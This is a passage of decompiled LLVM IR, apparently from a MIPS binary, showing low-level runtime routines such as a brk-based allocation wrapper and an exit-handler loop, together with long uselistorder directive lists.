  br i1 %v1_408078, label %dec_label_pc_40807c, label %dec_label_pc_4080d0

dec_label_pc_40807c:                              ; preds = %dec_label_pc_408068
  store i32 1, i32* @global_var_449e00.280, align 4
  store i32 %v3_408068, i32* @s0, align 4
  store i32 ptrtoint (i32* @global_var_406e64.199 to i32), i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_449a50.279 to i32), i32* %a0.global-to-local, align 4
  %v3_408090 = call i32 @function_4006d0()
  store i32 %v3_408090, i32* %v0.global-to-local, align 4
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  %v1_4080a8 = call i32 @unknown_0()
  store i32 %v1_4080a8, i32* %v0.global-to-local, align 4
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406e64.199 to i32), i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_449a50.279 to i32), i32* %a0.global-to-local, align 4
  %v5_4080c0 = call i32 @function_4052b0(i32* nonnull @global_var_449a50.279)
  store i32 %v5_4080c0, i32* %v0.global-to-local, align 4
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4080d0

dec_label_pc_4080d0:                              ; preds = %dec_label_pc_408068, %dec_label_pc_40807c
  %v1_4080d0 = add i32 %v1_407fe8, 268952
  %v2_4080d0 = inttoptr i32 %v1_4080d0 to i32*
  %v3_4080d0 = load i32, i32* %v2_4080d0, align 4
  store i32 %v3_4080d0, i32* %a0.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_4080d8 = add i32 %v3_4080d0, -25088
  %v2_4080d8 = inttoptr i32 %v1_4080d8 to i32*
  %v3_4080d8 = load i32, i32* %v2_4080d8, align 4
  store i32 %v3_4080d8, i32* %v1.global-to-local, align 4
  %v2_4080e0 = icmp eq i32 %v3_4080d8, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_4080e0, label %dec_label_pc_4080e4, label %dec_label_pc_408150

dec_label_pc_4080e4:                              ; preds = %dec_label_pc_4080d0
  %v1_4080e8 = add i32 %v1_407fe8, 268980
  %v2_4080e8 = inttoptr i32 %v1_4080e8 to i32*
  %v3_4080e8 = load i32, i32* %v2_4080e8, align 4
  store i32 2, i32* %v2_4080d8, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_4080f4 = ptrtoint i32* %tmp11 to i32
  store i32 %v2_4080f4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4080e8)
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  store i32 %v2_408014, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_408118.pre = load i32, i32* %v0.global-to-local, align 4
  %v2_40811812 = add i32 %v2_408014, 136
  %v2_40811c13 = add i32 %v2_40811812, %v0_408118.pre
  %v3_40811c14 = inttoptr i32 %v2_40811c13 to i32*
  store i32 -1, i32* %v3_40811c14, align 4
  %v0_40812015 = load i32, i32* %v1.global-to-local, align 4
  %v1_40812016 = add i32 %v0_40812015, -1
  store i32 %v1_40812016, i32* %v1.global-to-local, align 4
  %v1_40812417 = icmp sgt i32 %v1_40812016, -1
  %v3_40812418 = mul i32 %v1_40812016, 4
  store i32 %v3_40812418, i32* @v0, align 4
  br i1 %v1_40812417, label %dec_label_pc_408118.dec_label_pc_408118_crit_edge, label %dec_label_pc_408128

dec_label_pc_408118.dec_label_pc_408118_crit_edge: ; preds = %dec_label_pc_4080e4, %dec_label_pc_408118.dec_label_pc_408118_crit_edge
  %v3_40812419 = phi i32 [ %v3_408124, %dec_label_pc_408118.dec_label_pc_408118_crit_edge ], [ %v3_40812418, %dec_label_pc_4080e4 ]
  %v1_408118.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_40811c.pre = load i32, i32* %a0.global-to-local, align 4
  %v2_408118 = add i32 %v1_408118.pre, 136
  %v2_40811c = add i32 %v2_408118, %v3_40812419
  %v3_40811c = inttoptr i32 %v2_40811c to i32*
  store i32 %v0_40811c.pre, i32* %v3_40811c, align 4
  %v0_408120 = load i32, i32* %v1.global-to-local, align 4
  %v1_408120 = add i32 %v0_408120, -1
  store i32 %v1_408120, i32* %v1.global-to-local, align 4
  %v1_408124 = icmp sgt i32 %v1_408120, -1
  %v3_408124 = mul i32 %v1_408120, 4
  store i32 %v3_408124, i32* @v0, align 4
  br i1 %v1_408124, label %dec_label_pc_408118.dec_label_pc_408118_crit_edge, label %dec_label_pc_408128

dec_label_pc_408128:                              ; preds = %dec_label_pc_408118.dec_label_pc_408118_crit_edge, %dec_label_pc_4080e4
  store i32 0, i32* %tmp11, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  store i32 %v2_4080f4, i32* %a1.global-to-local, align 4
  %v3_40813c = call i32 @function_406e6c(i32 6, i32 %v2_4080f4)
  store i32 %v3_40813c, i32* %v0.global-to-local, align 4
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  %v0_408150.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_408150

dec_label_pc_408150:                              ; preds = %dec_label_pc_4080d0, %dec_label_pc_408128
  %v1_408150 = phi i32 [ 2, %dec_label_pc_4080d0 ], [ %v3_40813c, %dec_label_pc_408128 ]
  %v0_408150 = phi i32 [ %v3_4080d8, %dec_label_pc_4080d0 ], [ %v0_408150.pre, %dec_label_pc_408128 ]
  %v2_408150 = icmp eq i32 %v0_408150, %v1_408150
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_408150, label %dec_label_pc_408154, label %dec_label_pc_408160

dec_label_pc_408154:                              ; preds = %dec_label_pc_408150
  %v1_408158 = load i32, i32* %a0.global-to-local, align 4
  %v2_408158 = add i32 %v1_408158, -25088
  %v3_408158 = inttoptr i32 %v2_408158 to i32*
  store i32 3, i32* %v3_408158, align 4
  br label %dec_label_pc_408160

dec_label_pc_408160:                              ; preds = %dec_label_pc_408150, %dec_label_pc_408154
  %v0_408160 = load i32, i32* %a0.global-to-local, align 4
  %v1_408160 = add i32 %v0_408160, -25088
  %v2_408160 = inttoptr i32 %v1_408160 to i32*
  %v3_408160 = load i32, i32* %v2_408160, align 4
  store i32 %v3_408160, i32* %v1.global-to-local, align 4
  %v2_408168 = icmp eq i32 %v3_408160, 3
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_408168, label %dec_label_pc_40816c, label %dec_label_pc_408180

dec_label_pc_40816c:                              ; preds = %dec_label_pc_408160
  %v0_408170 = load i32, i32* %gp.global-to-local, align 4
  %v1_408170 = add i32 %v0_408170, -32420
  %v2_408170 = inttoptr i32 %v1_408170 to i32*
  %v3_408170 = load i32, i32* %v2_408170, align 4
  store i32 4, i32* %v2_408160, align 4
  store i32 127, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408170)
  br label %dec_label_pc_408180

dec_label_pc_408180:                              ; preds = %dec_label_pc_408160, %dec_label_pc_40816c
  ret i32 4

; uselistorder directives
  uselistorder i32 %v3_40812418, { 1, 0 }
  uselistorder i32 %v2_4080f4, { 1, 0, 2 }
  uselistorder i32 %v3_40802c25, { 1, 0 }
  uselistorder i32 %v2_408014, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_407fe8, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %tmp11, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 10, 1, 9, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 5, 3, 4, 2, 6, 7, 9, 8, 10, 12, 11, 13 }
  uselistorder i32* %gp.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %a0.global-to-local, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 10, 9, 11, 12 }
  uselistorder i32 127, { 1, 2, 0, 3 }
  uselistorder i32 3, { 4, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 3, 23, 24, 25, 5, 26, 27, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32 (i32, i32)* @function_406e6c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 136, { 1, 0, 2, 3 }
  uselistorder i32 ()* @function_4006d0, { 1, 0 }
  uselistorder i32* @global_var_449a78.2, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 ()* @unknown_0, { 7, 6, 5, 4, 3, 2, 1, 0, 10, 9, 8 }
  uselistorder i32 2, { 6, 7, 31, 32, 33, 34, 35, 36, 3, 37, 0, 38, 13, 14, 1, 4, 5, 10, 9, 15, 39, 40, 16, 41, 17, 42, 43, 18, 44, 19, 45, 46, 20, 11, 2, 21, 47, 22, 23, 24, 25, 26, 48, 29, 28, 27, 8, 30, 49, 12, 50, 51 }
  uselistorder i32 ()* @function_404c80, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @a1, { 17, 18, 19, 4, 1, 20, 5, 21, 22, 23, 24, 25, 16, 26, 6, 27, 28, 15, 14, 13, 12, 29, 3, 30, 31, 7, 2, 0, 11, 32, 33, 34, 35, 8, 36, 9, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 10, 64, 65, 66, 67, 68, 69 }
  uselistorder i32 6, { 3, 5, 6, 7, 1, 8, 0, 9, 10, 11, 12, 13, 2, 4 }
  uselistorder i32* @a0, { 21, 2, 22, 23, 0, 1, 7, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 19, 18, 37, 8, 5, 38, 39, 40, 9, 41, 42, 10, 3, 4, 43, 17, 44, 45, 20, 11, 12, 46, 47, 16, 6, 13, 48, 49, 14, 15, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder i32 4, { 0, 48, 57, 1, 2, 3, 4, 58, 59, 39, 40, 5, 6, 60, 61, 41, 42, 7, 62, 8, 9, 63, 64, 65, 66, 67, 10, 11, 12, 68, 69, 43, 13, 14, 15, 16, 17, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 18, 19, 20, 21, 22, 84, 85, 86, 23, 87, 88, 89, 24, 25, 26, 27, 90, 91, 28, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 29, 30, 103, 104, 105, 106, 107, 108, 53, 109, 45, 110, 44, 111, 46, 112, 31, 113, 114, 115, 116, 32, 47, 117, 118, 119, 33, 120, 121, 122, 123, 124, 125, 34, 126, 127, 52, 128, 35, 54, 55, 36, 37, 38, 129, 130, 131, 132, 49, 50, 56, 51, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146 }
  uselistorder i32 32, { 19, 20, 21, 22, 0, 23, 24, 25, 26, 27, 28, 1, 2, 3, 29, 16, 14, 30, 4, 5, 6, 31, 7, 9, 8, 10, 11, 12, 13, 15, 32, 33, 34, 17, 35, 18 }
  uselistorder i32 ptrtoint (i32* @global_var_406e64.199 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_408180, { 1, 0 }
  uselistorder label %dec_label_pc_408160, { 1, 0 }
  uselistorder label %dec_label_pc_408150, { 1, 0 }
  uselistorder label %dec_label_pc_408118.dec_label_pc_408118_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4080d0, { 1, 0 }
  uselistorder label %dec_label_pc_408068, { 1, 0 }
  uselistorder label %dec_label_pc_408020.dec_label_pc_408020_crit_edge, { 1, 0 }
}

define i32 @function_408190(i32 %arg1) local_unnamed_addr {
dec_label_pc_408190:
  %v1_40819c = add i32 %arg1, 28
  %v2_40819c = inttoptr i32 %v1_40819c to i32*
  %v3_40819c = load i32, i32* %v2_40819c, align 4
  %v3_4081a0 = load i32, i32* bitcast (i32** @global_var_449bfc.284 to i32*), align 4
  %v2_4081a8 = inttoptr i32 %v3_4081a0 to i32*
  store i32 %v3_40819c, i32* %v2_4081a8, align 4
  %v1_4081ac = add i32 %arg1, 44
  %v2_4081ac = inttoptr i32 %v1_4081ac to i32*
  %v3_4081ac = load i32, i32* %v2_4081ac, align 4
  %v3_4081b0 = load i32, i32* bitcast (i32** @global_var_449b70.286 to i32*), align 4
  %v3_4081b4 = inttoptr i32 %v3_4081b0 to i32*
  store i32 %v3_4081ac, i32* %v3_4081b4, align 4
  ret i32 %v3_4081b0

; uselistorder directives
  uselistorder i32 28, { 3, 4, 5, 6, 7, 8, 9, 10, 1, 11, 2, 12, 0 }
}

define i32 @function_4081c0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4081c0:
  %a0.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v3_4081d8 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4081d8, i32* %a2.global-to-local, align 4
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v2_4081ec = call i32 @brk(i32* %arg1)
  %v3_4081f0 = load i32, i32* bitcast (i32** @global_var_449b74.276 to i32*), align 4
  %v2_4081f4 = icmp ult i32 %v2_4081ec, %tmp
  store i32 0, i32* %a0.global-to-local, align 4
  %v1_4081fc = icmp eq i1 %v2_4081f4, false
  %v4_4081fc = inttoptr i32 %v3_4081f0 to i32*
  store i32 %v2_4081ec, i32* %v4_4081fc, align 4
  br i1 %v1_4081fc, label %dec_label_pc_408220, label %dec_label_pc_408200

dec_label_pc_408200:                              ; preds = %dec_label_pc_4081c0
  %v0_408204 = load i32, i32* %a2.global-to-local, align 4
  store i32 %v0_408204, i32* @t9, align 4
  %v1_408208 = call i32 @function_4057a0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_40821c = inttoptr i32 %v1_408208 to i32*
  store i32 12, i32* %v2_40821c, align 4
  br label %dec_label_pc_408220

dec_label_pc_408220:                              ; preds = %dec_label_pc_4081c0, %dec_label_pc_408200
  %v0_408224 = load i32, i32* %a0.global-to-local, align 4
  ret i32 %v0_408224

; uselistorder directives
  uselistorder i32* %a0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32 12, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 0, 19, 4, 20, 5, 21, 22, 23, 24, 6, 25, 26, 27, 7, 28, 29, 30, 31, 32, 2, 33, 34, 35, 36, 37 }
  uselistorder i32 ()* @function_4057a0, { 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 2, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i1 false, { 9, 0, 1, 10, 11, 6, 12, 13, 2, 7, 14, 15, 3, 4, 16, 17, 18, 19, 5, 20, 8, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_408220, { 1, 0 }
}

define i32 @function_408230(i32 %arg1) local_unnamed_addr {
dec_label_pc_408230:
  %s1.global-to-local = alloca i32, align 4
  %v0_408240 = load i32, i32* @ra, align 4
  %v0_408244 = load i32, i32* @s0, align 4
  %v3_40824c = load i32, i32* @global_var_449abc.287, align 4
  store i32 %v3_40824c, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_408254 = call i32 @function_404ef0()
  %v0_408260 = load i32, i32* @s0, align 4
  %v3_408264 = load i32, i32* @global_var_449ac0.288, align 4
  store i32 %v3_408264, i32* @t9, align 4
  store i32 %v0_408240, i32* @ra, align 4
  store i32 %v0_408244, i32* @s0, align 4
  %v6_408274 = call i32 @function_405010(i32 %v2_408254, i32 %v0_408260)
  %v1_408288 = load i32, i32* @t9, align 4
  %v1_4082a0 = add i32 %v1_408288, 268280
  %v2_4082a0 = inttoptr i32 %v1_4082a0 to i32*
  %v3_4082a0 = load i32, i32* %v2_4082a0, align 4
  %v1_4082a8 = add i32 %v3_4082a0, -26444
  %v1_4082ac = add i32 %v3_4082a0, -26448
  %v2_4082ac = inttoptr i32 %v1_4082ac to i32*
  %v3_4082ac = load i32, i32* %v2_4082ac, align 4
  %v2_4082b4 = icmp eq i32 %v3_4082ac, -1
  br i1 %v2_4082b4, label %dec_label_pc_4082d8, label %dec_label_pc_4082b8

dec_label_pc_4082b8:                              ; preds = %dec_label_pc_408230
  store i32 -1, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4082c0

dec_label_pc_4082c0:                              ; preds = %dec_label_pc_4082c0, %dec_label_pc_4082b8
  %v1_4082c0 = phi i32 [ %v2_4082c0, %dec_label_pc_4082c0 ], [ %v1_4082ac, %dec_label_pc_4082b8 ]
  %v0_4082c0 = phi i32 [ %v2_4082c8, %dec_label_pc_4082c0 ], [ %v3_4082ac, %dec_label_pc_4082b8 ]
  %v2_4082c0 = add i32 %v1_4082c0, -4
  call void @__pseudo_call(i32 %v0_4082c0)
  %v1_4082c8 = inttoptr i32 %v2_4082c0 to i32*
  %v2_4082c8 = load i32, i32* %v1_4082c8, align 4
  %v1_4082d0 = load i32, i32* %s1.global-to-local, align 4
  %v2_4082d0 = icmp eq i32 %v2_4082c8, %v1_4082d0
  br i1 %v2_4082d0, label %dec_label_pc_4082d8, label %dec_label_pc_4082c0

dec_label_pc_4082d8:                              ; preds = %dec_label_pc_4082c0, %dec_label_pc_408230
  ret i32 %v1_4082a8

; uselistorder directives
  uselistorder i32 %v2_4082c8, { 1, 0 }
  uselistorder i32 -4, { 13, 14, 4, 15, 16, 5, 17, 6, 2, 18, 3, 7, 8, 9, 19, 10, 11, 1, 20, 12, 21, 0 }
  uselistorder i32 -1, { 103, 22, 104, 93, 105, 11, 12, 13, 106, 94, 107, 9, 10, 23, 108, 109, 110, 24, 95, 25, 111, 26, 27, 28, 112, 29, 113, 114, 115, 67, 117, 116, 30, 118, 31, 119, 32, 120, 71, 121, 96, 0, 122, 123, 97, 98, 124, 125, 99, 126, 72, 127, 73, 128, 129, 7, 8, 130, 131, 132, 1, 33, 133, 134, 100, 135, 136, 74, 137, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 138, 139, 140, 17, 18, 19, 141, 142, 143, 144, 145, 14, 15, 16, 101, 102, 45, 146, 46, 47, 48, 49, 50, 51, 52, 147, 53, 148, 54, 149, 55, 56, 57, 58, 59, 60, 150, 61, 151, 62, 2, 152, 153, 154, 155, 156, 69, 157, 158, 75, 3, 159, 70, 76, 4, 160, 20, 161, 162, 63, 163, 77, 164, 78, 165, 64, 79, 166, 68, 80, 167, 81, 168, 82, 169, 170, 171, 83, 172, 84, 173, 174, 175, 5, 176, 85, 177, 21, 86, 178, 179, 87, 180, 65, 181, 88, 182, 66, 89, 183, 90, 6, 184, 91, 92 }
  uselistorder i32 (i32, i32)* @function_405010, { 2, 1, 0 }
  uselistorder i32 ()* @function_404ef0, { 1, 0 }
  uselistorder i32* @t9, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 0, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 1, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316 }
  uselistorder i32* @s0, { 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 4, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 5, 6, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167 }
  uselistorder i32 1, { 106, 79, 78, 292, 413, 289, 414, 332, 331, 176, 177, 175, 173, 174, 415, 416, 270, 271, 399, 208, 209, 210, 211, 212, 213, 216, 217, 214, 215, 219, 218, 52, 50, 51, 53, 56, 54, 55, 57, 75, 77, 76, 267, 266, 49, 346, 201, 200, 265, 248, 249, 264, 347, 253, 262, 251, 254, 255, 257, 258, 259, 260, 263, 256, 261, 252, 400, 166, 164, 165, 163, 348, 167, 80, 81, 1, 333, 89, 90, 417, 418, 349, 94, 96, 92, 95, 99, 91, 97, 100, 98, 93, 277, 290, 419, 221, 293, 420, 421, 345, 344, 343, 342, 87, 85, 83, 82, 86, 84, 294, 350, 250, 60, 62, 63, 61, 58, 64, 59, 68, 66, 65, 67, 103, 104, 105, 16, 14, 15, 278, 422, 351, 199, 197, 196, 198, 295, 296, 401, 354, 353, 352, 241, 242, 240, 162, 192, 222, 195, 269, 131, 268, 48, 12, 13, 23, 423, 279, 424, 425, 125, 123, 113, 114, 112, 124, 116, 118, 119, 120, 117, 121, 122, 115, 426, 272, 402, 70, 71, 355, 297, 403, 356, 357, 287, 358, 72, 73, 74, 21, 22, 207, 191, 18, 19, 20, 2, 193, 3, 206, 205, 359, 204, 88, 47, 203, 202, 427, 428, 429, 430, 69, 360, 431, 432, 433, 434, 435, 361, 39, 42, 40, 41, 43, 38, 37, 436, 437, 363, 362, 179, 183, 184, 185, 186, 178, 180, 187, 181, 182, 438, 439, 440, 441, 442, 443, 404, 44, 46, 45, 444, 445, 324, 17, 298, 365, 364, 446, 447, 299, 300, 6, 5, 4, 7, 448, 449, 450, 451, 452, 194, 453, 454, 455, 366, 11, 8, 9, 10, 456, 457, 458, 459, 460, 273, 190, 188, 189, 461, 462, 26, 463, 464, 220, 465, 466, 467, 102, 101, 468, 469, 301, 302, 337, 336, 335, 334, 109, 108, 110, 107, 111, 470, 405, 406, 407, 471, 408, 472, 473, 474, 475, 476, 477, 409, 280, 478, 275, 479, 303, 480, 481, 482, 281, 483, 484, 485, 304, 410, 376, 375, 374, 373, 372, 371, 370, 369, 368, 325, 367, 159, 161, 157, 155, 156, 153, 154, 158, 160, 36, 35, 34, 411, 412, 486, 305, 379, 378, 377, 169, 170, 171, 172, 168, 487, 488, 149, 147, 148, 151, 145, 146, 152, 150, 489, 490, 491, 492, 493, 494, 276, 495, 496, 306, 497, 498, 307, 499, 500, 501, 502, 503, 504, 505, 506, 507, 388, 328, 387, 386, 385, 326, 384, 383, 382, 327, 381, 380, 229, 239, 231, 227, 235, 228, 226, 238, 225, 236, 237, 234, 233, 232, 230, 508, 25, 24, 310, 308, 309, 311, 312, 509, 274, 313, 314, 315, 510, 316, 317, 318, 319, 320, 511, 321, 322, 512, 396, 395, 394, 393, 392, 329, 391, 390, 389, 30, 32, 27, 29, 28, 33, 31, 323, 513, 282, 514, 515, 398, 397, 516, 517, 518, 519, 520, 283, 521, 522, 284, 285, 523, 291, 524, 525, 526, 527, 528, 330, 341, 340, 339, 338, 135, 143, 140, 133, 132, 141, 134, 139, 136, 144, 137, 138, 142, 288, 223, 224, 529, 0, 530, 531, 532, 533, 130, 127, 126, 129, 128, 534, 535, 536, 246, 247, 243, 245, 244, 286 }
}

define i32 @function_4082f0() local_unnamed_addr {
entry:
  %v0_408304 = load i32, i32* @ra, align 4
  %v1_408320 = add i32 %v0_408304, 268140
  %v2_408320 = inttoptr i32 %v1_408320 to i32*
  %v3_408320 = load i32, i32* %v2_408320, align 4
  %v1_408328 = add i32 %v3_408320, 288
  call void @__pseudo_call(i32 %v1_408328)
  %v4_408344 = load i32, i32* @v0, align 4
  ret i32 %v4_408344

; uselistorder directives
  uselistorder i32* @v0, { 8, 43, 0, 44, 45, 46, 47, 3, 1, 48, 49, 6, 7, 20, 50, 21, 51, 22, 52, 53, 11, 54, 55, 12, 2, 56, 5, 4, 57, 13, 14, 15, 16, 17, 58, 18, 19, 59, 34, 35, 60, 61, 36, 62, 63, 64, 23, 24, 65, 25, 26, 27, 28, 66, 29, 67, 68, 69, 70, 30, 31, 32, 71, 33, 72, 73, 74, 75, 37, 38, 39, 40, 41, 76, 42, 9, 10 }
  uselistorder void (i32)* @__pseudo_call, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 0, 1, 2 }
  uselistorder i32 0, { 161, 145, 162, 163, 164, 165, 15, 166, 167, 168, 169, 170, 171, 172, 75, 173, 174, 76, 175, 176, 177, 178, 179, 180, 22, 181, 182, 183, 184, 185, 186, 25, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 28, 27, 77, 78, 198, 199, 200, 201, 202, 203, 26, 204, 79, 205, 29, 206, 207, 208, 80, 81, 0, 209, 210, 23, 211, 212, 213, 214, 215, 30, 216, 217, 218, 219, 220, 221, 222, 223, 224, 19, 225, 226, 227, 228, 229, 230, 1, 231, 232, 233, 234, 235, 236, 82, 237, 31, 69, 238, 239, 240, 241, 242, 243, 244, 245, 246, 2, 3, 154, 247, 12, 155, 248, 249, 250, 144, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 17, 261, 32, 262, 263, 264, 265, 266, 267, 268, 16, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 33, 303, 34, 11, 304, 35, 305, 306, 307, 308, 309, 310, 83, 311, 312, 313, 314, 315, 316, 317, 36, 318, 319, 320, 321, 37, 322, 38, 39, 323, 84, 324, 40, 325, 326, 327, 328, 20, 21, 41, 43, 42, 10, 44, 329, 330, 331, 332, 333, 334, 46, 45, 335, 65, 18, 336, 337, 47, 338, 339, 340, 341, 71, 342, 343, 86, 87, 344, 345, 88, 89, 346, 347, 348, 90, 349, 350, 351, 352, 353, 354, 355, 146, 91, 92, 147, 356, 357, 358, 70, 359, 360, 93, 85, 361, 362, 363, 364, 148, 149, 365, 48, 366, 367, 49, 50, 368, 369, 94, 370, 150, 95, 371, 51, 372, 4, 5, 373, 96, 374, 375, 97, 98, 99, 376, 377, 378, 100, 101, 379, 380, 381, 382, 102, 383, 103, 53, 52, 384, 385, 66, 54, 386, 151, 387, 67, 152, 388, 389, 153, 390, 391, 392, 393, 104, 394, 395, 105, 396, 397, 106, 398, 13, 14, 6, 399, 400, 107, 7, 72, 401, 73, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 24, 57, 56, 55, 416, 417, 68, 418, 419, 420, 421, 9, 422, 423, 424, 8, 425, 62, 426, 58, 427, 59, 428, 63, 429, 60, 430, 61, 431, 64, 74, 156, 157, 158, 159, 160, 108, 109, 110, 111, 112, 113, 114, 115, 